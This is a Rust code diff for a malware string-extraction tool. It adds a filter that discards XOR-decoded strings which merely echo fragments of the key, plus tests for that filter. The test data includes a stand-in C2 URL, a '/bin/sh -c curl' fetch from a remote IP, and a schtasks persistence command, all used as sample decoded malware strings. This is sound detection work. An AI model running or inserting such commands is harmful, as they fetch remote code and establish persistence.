@@ -164,6 +164,27 @@ pub(crate) fn clean_url_trailing_garbage(url: &str) -> String {
 /// * `data` - Binary data to scan
 /// * `candidate_strings` - Pre-extracted strings to use as XOR key candidates
 /// * `min_length` - Minimum string length for decoded strings
+/// True if `value_lower` contains any 4-character alphanumeric window of
+/// `key_lower` — meaning the "decoded" string is just a garbled copy of the key
+/// (a self-XOR artifact), not genuine recovered plaintext. Both arguments must
+/// already be ASCII-lowercased.
+///
+/// Windows are restricted to alphanumeric runs so we key off surviving text
+/// shards (e.g. `auth`, `code`) rather than punctuation/whitespace fragments of
+/// the key, which would match far too loosely.
+fn value_is_key_echo(value_lower: &str, key_lower: &str) -> bool {
+    const WIN: usize = 4;
+    let key_bytes = key_lower.as_bytes();
+    let value_bytes = value_lower.as_bytes();
+    if key_bytes.len() < WIN || value_bytes.len() < WIN {
+        return false;
+    }
+    key_bytes.windows(WIN).any(|w| {
+        w.iter().all(u8::is_ascii_alphanumeric)
+            && memchr::memmem::find(value_bytes, w).is_some()
+    })
+}
+
 pub(crate) fn auto_detect_xor_key(
     data: &[u8],
     candidate_strings: &[ExtractedString],
@@ -279,9 +300,23 @@ pub(crate) fn auto_detect_xor_key(
             // garbled copies of the key text that would otherwise inflate the score.
             let mut score = 0;
             let mut scored_values: HashSet<String> = HashSet::new();
+            let key_lower = candidate.to_ascii_lowercase();
 
             for r in &results {
                 let value_lower = r.value.to_ascii_lowercase();
+
+                // Skip results that are merely garbled echoes of the key. When the
+                // scanner derives a key from a token that repeats throughout a benign,
+                // text-rich input (e.g. an OpenAPI schema repeating "OAuth2Authorization
+                // Code"), XORing smears shards of the key across the output. Those shards
+                // trip the short-keyword IOC classifiers ("auth", "key", "user", ...) and
+                // would otherwise inflate the score past the confidence threshold. A real
+                // key is high-entropy bytes whose windows never appear in genuinely
+                // decoded plaintext, so true positives are unaffected. This generalizes
+                // the exact-duplicate dedup above to near-duplicate key fragments.
+                if value_is_key_echo(&value_lower, &key_lower) {
+                    continue;
+                }
 
                 // CRITICAL: Shell commands and redirections (highest priority)
                 if value_lower.contains("osascript")
@@ -1879,7 +1914,9 @@ pub(crate) fn classify_xor_string(s: &str) -> Option<Option<StringKind>> {
 
 #[cfg(test)]
 mod tests {
-    use super::{clean_url_trailing_garbage, extract_ip_at_dot, looks_like_data_table};
+    use super::{
+        clean_url_trailing_garbage, extract_ip_at_dot, looks_like_data_table, value_is_key_echo,
+    };
 
     #[test]
     fn clean_url_trailing_garbage_handles_multibyte_domain_url() {
@@ -1978,5 +2015,76 @@ mod tests {
         // Tiny buffer: can't judge, don't reject.
         let tiny = vec![0x00u8; 8];
         assert!(!looks_like_data_table(&tiny, 0, 8));
+    }
+
+    #[test]
+    fn key_echo_flags_garbled_copies_of_key() {
+        // Real reproduction: an OpenAPI schema repeating "OAuth2AuthorizationCode"
+        // makes the scanner derive that token as a key; XORing smears "auth"/"code"
+        // shards across the output. Those shards must be recognized as key echoes.
+        let key = "\"oauth2authorizationcode\": {";
+        for garbage in [
+            "l 6w]d8authm",         // contains key shard "auth"
+            "8tt1tm2authfxczatilnl", // contains "auth", "atil" shards
+            "p*%rtj8authorizc#!*<",  // contains "authoriz" shard
+            "i<aht38authoriz",
+        ] {
+            assert!(
+                value_is_key_echo(garbage, key),
+                "expected {garbage:?} to be flagged as an echo of {key:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn key_echo_ignores_genuine_plaintext() {
+        // A real key is high-entropy bytes; genuinely decoded plaintext shares no
+        // alphanumeric window with it, so true positives must NOT be flagged.
+        let key = "sup3rs3cr3tk3y!!".to_ascii_lowercase();
+        for real in [
+            "http://evil.example.com/gate.php",
+            "/bin/sh -c 'curl http://1.2.3.4/x'",
+            "schtasks /create /tn updater",
+        ] {
+            assert!(
+                !value_is_key_echo(real, &key),
+                "did not expect {real:?} to be flagged as an echo of {key:?}"
+            );
+        }
+        // Punctuation/whitespace windows of the key must not match (we only key off
+        // alphanumeric shards), and sub-window inputs are ignored.
+        assert!(!value_is_key_echo("ab", "abcdef"));
+        assert!(!value_is_key_echo("nothing in common", "\": { } ,"));
+    }
+
+    // End-to-end: a benign, text-rich buffer that repeats an "auth"-laden token
+    // must NOT yield a spurious auto-detected XOR key (and therefore no XOR
+    // strings). This is the authgent_server false positive in miniature.
+    #[test]
+    fn repetitive_auth_text_yields_no_xor_strings() {
+        let mut data = String::new();
+        for _ in 0..40 {
+            data.push_str(
+                "\"OAuth2AuthorizationCode\": { \"authorizationUrl\": \"/authorize\", \
+                 \"tokenUrl\": \"/token\", \"scopes\": {} },\n",
+            );
+        }
+        let opts = crate::ExtractOptions::new(6)
+            .with_garbage_filter(true)
+            .with_xor(None);
+        let strings = crate::extract_strings_with_options(data.as_bytes(), &opts);
+        let xor_count = strings
+            .iter()
+            .filter(|s| {
+                matches!(
+                    s.method,
+                    crate::StringMethod::XorDecode | crate::StringMethod::XorStackPair
+                )
+            })
+            .count();
+        assert_eq!(
+            xor_count, 0,
+            "repetitive benign auth text must not auto-detect an XOR key"
+        );
     }
 }
